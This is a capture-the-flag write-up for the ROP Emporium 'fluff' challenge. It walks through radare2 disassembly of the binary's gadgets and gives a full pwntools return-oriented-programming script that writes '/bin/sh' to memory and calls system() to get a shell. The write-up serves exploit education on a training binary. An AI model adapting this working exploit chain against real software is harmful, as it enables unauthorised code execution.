# fluff

Downloading, unzipping, and running the [challenge file](https://ropemporium.com/binary/fluff.zip):

```sh
$ ./fluff
fluff by ROP Emporium
64bits

You know changing these strings means I have to rewrite my solutions...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    24567 segmentation fault (core dumped)  ./fluff
```

The intro text for this challenge says:
 > The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. If we take the time to consider a different approach we'll succeed.

Let's fire up radare and see:
```asm
$ r2 -A fluff
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- [INSERT SPECIOUS BANALITY HERE]

[0x00400650]> pd @ sym.usefulFunction 
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bf5b094000     mov edi, str.bin_ls         ; 0x40095b ; "/bin/ls" ; const char *string
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
            0x00400818      0f1f84000000.  nop dword [rax + rax]
            ;-- questionableGadgets:
            0x00400820      415f           pop r15
            0x00400822      4d31db         xor r11, r11
            0x00400825      415e           pop r14
            0x00400827      bf50106000     mov edi, loc.__data_start   ; 0x601050
            0x0040082c      c3             ret
            0x0040082d      415e           pop r14
            0x0040082f      4d31e3         xor r11, r12
            0x00400832      415c           pop r12
            0x00400834      41bd60406000   mov r13d, 0x604060          ; '`@`'
            0x0040083a      c3             ret
            0x0040083b      bf50106000     mov edi, loc.__data_start   ; 0x601050
            0x00400840      4d87d3         xchg r11, r10
            0x00400843      415f           pop r15
            0x00400845      41bb50206000   mov r11d, 0x602050          ; 'P `'
            0x0040084b      c3             ret
            0x0040084c      415f           pop r15
            0x0040084e      4d891a         mov qword [r10], r11
            0x00400851      415d           pop r13
            0x00400853      415c           pop r12
            0x00400855      453022         xor byte [r10], r12b
            0x00400858      c3             ret
            0x00400859      0f1f80000000.  nop dword [rax]
```

This *is* similar to the [write4](../write4/README.md) challenge.

The significant difference is that instead of the `usefulGadgets` we had last time, we're instead presented with these `questionableGadgets`.

We still want to be able to write our string to memory and then pop the address of that string into our `rdi` register. 

We can use the same technique as last time to find the appropriate data address.

This time, we just need to figure out how to make these gadgets work for us.

Some things immediately stand out:
 - `xor r11, r11` will zero out the `r11` register
 - if `r11` is zero, `xor r11, r12` will put the contents of `r12` into `r11`
 - `mov qword [r10], r11` will put the contents of `r11` into the address pointed to by `r10`, but it's followed by a `xor byte [r10], r12b` so we'll need to be cognizant of that. If we don't, it will mangle our string.
 - `xchg r11, r10` is our opportunity to set `r10` since we can set `r11` to arbitrary values

With the above in mind, the only remaining tricky part is dealing with the `xor byte [r10], r12b` at the end of our `mov` gadget.

Since that gadget also gives us control of `r12`, we can simply `xor` the first byte of our string by the same value we pop into `r12`:

```python
from pwn import *
prog = process("./fluff")

data_addr = p64(0x00601050)
system_call = p64(0x00400810)
pop_rdi = p64(0x004008c3)

# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
xor_r11_r11_pop_r14 = p64(0x00400822) # clears r11

# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xchg_r11_r10_pop_r15_mov_r11 = p64(0x00400840)

# 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xor_r11_r12_pop_r12_mov_r13 = p64(0x0040082f)

# 0x004008bc               415c  pop r12
# 0x004008be               415d  pop r13
# 0x004008c0               415e  pop r14
# 0x004008c2               415f  pop r15
# 0x004008c4                 c3  ret
pop_r12_r13_r14_r15 = p64(0x004008bc)

# 0x0040084e             4d891a  mov qword [r10], r11
# 0x00400851               415d  pop r13
# 0x00400853               415c  pop r12
# 0x00400855             453022  xor byte [r10], r12b
# 0x00400858                 c3  ret
mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 = p64(0x0040084e)

payload = "A" * 40

payload += xor_r11_r11_pop_r14; # clear r11
payload += p64(0xaa) # junk for the r14 pop

payload += pop_r12_r13_r14_r15
payload += data_addr # pop into r12 in order to get xor'd into r11
payload += p64(0xaa) # junk for the r13 pop
payload += p64(0xaa) # junk for the r14 pop
payload += p64(0xaa) # junk for the r15 pop

payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our data addr) into r11
payload += p64(0xaa) # junk for the r12 pop

payload += xchg_r11_r10_pop_r15_mov_r11 # exchange our data addr from r11 into r10
payload += p64(0xaa) # junk for the r15 pop

payload += xor_r11_r11_pop_r14; # clear r11
payload += p64(0xaa) # junk for the r14 pop

payload += pop_r12_r13_r14_r15 # pop our string into r12 in order to get xor'd into r11
payload += (chr(0x2f ^ 0x11) + "bin/sh\0")
payload += p64(0xaa) # junk for the r13 pop
payload += p64(0xaa) # junk for the r14 pop
payload += p64(0xaa) # junk for the r15 pop

payload += xor_r11_r12_pop_r12_mov_r13 # xor r12 (which holds our string) into r11
payload += p64(0x11) # junk for the r12 pop

payload += mov_r11_r10_pop_r13_pop_r12_xor_r10_r12 # mov our string from r11 into area of memory pointed to by r10
payload += p64(0xaa) # junk for the r13 pop
payload += p64(0x11) # the byte we'll want to xor against the first byte of our string

# Put our data address into rdi and jump to system call
payload += pop_rdi
payload += data_addr
payload += system_call

print prog.sendlineafter("> ", payload)

prog.interactive()
```

Run it!

```sh
$ python exploit.py
[+] Starting local process './fluff': pid 29227
fluff by ROP Emporium
64bits

You know changing these strings means I have to rewrite my solutions...

[*] Switching to interactive mode
$ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
```
😼
